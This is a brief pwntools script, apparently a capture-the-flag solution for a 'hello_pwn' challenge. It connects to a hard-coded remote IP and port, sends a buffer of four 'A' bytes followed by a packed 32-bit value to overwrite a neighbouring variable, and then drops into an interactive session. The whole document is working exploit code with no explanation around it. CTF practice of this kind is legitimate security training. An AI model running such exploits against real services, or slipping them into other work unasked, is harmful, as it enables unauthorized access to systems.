from pwn import *
sh = remote('111.198.29.45',31278)
#sh = process('./hello_pwn')
sh.recv()
payload = 'A'*4 + p32(0x6e756161)
sh.sendline(payload)
sh.interactive()
